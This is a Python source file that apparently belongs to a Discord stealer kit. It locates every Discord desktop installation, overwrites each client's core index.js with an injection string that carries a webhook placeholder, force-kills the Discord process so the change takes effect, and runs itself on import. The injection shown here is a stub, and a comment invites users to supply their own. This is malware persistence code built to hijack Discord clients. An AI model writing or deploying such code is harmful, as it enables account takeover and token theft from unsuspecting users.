import re

from hardware.components.processes import Processes

from os import getenv, kill, popen
from os.path import join, sep, exists
from glob import glob
from typing import List

INJECTION = "//caca xd\nmodule.exports = require('./core.asar');"  # if empty will not do anything, put your own injection if you want this module
DISCORD_REGEX = re.compile(r"Discord(.*?)\.exe")


class DiscordProcess:
    def __init__(self, process, index):
        self.process = process
        self.index = index


def InjectDiscordClients(webhook: str):
    if INJECTION is None or INJECTION == "":
        return
    clients = GetDiscordClientsFolders()
    for client in clients:
        f = open(client.index, "w", encoding="utf-8")
        f.write(INJECTION.replace("%WEBHOOK%", webhook))
        f.close()
        pid = GetDiscordPid(client.process)
        popen(f"taskkill /F /PID {pid}")
        #popen(f"{client.process} --ProcessStart {client.process}")


def GetDiscordPid(processname: str) -> int:
    for p in Processes():
        if p.name() == processname.split(sep)[-1:][0]:
            return p.pid


def GetDiscordClientsFolders() -> List[DiscordProcess]:
    res = []
    for p in glob(f"{getenv('LOCALAPPDATA')}\\Discord*\\app-*\\"):
        proc = join(p, "..", "Update.exe")
        index = join(p, "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js")
        res.append(DiscordProcess(proc, index))
    return res


InjectDiscordClients("caca lol")
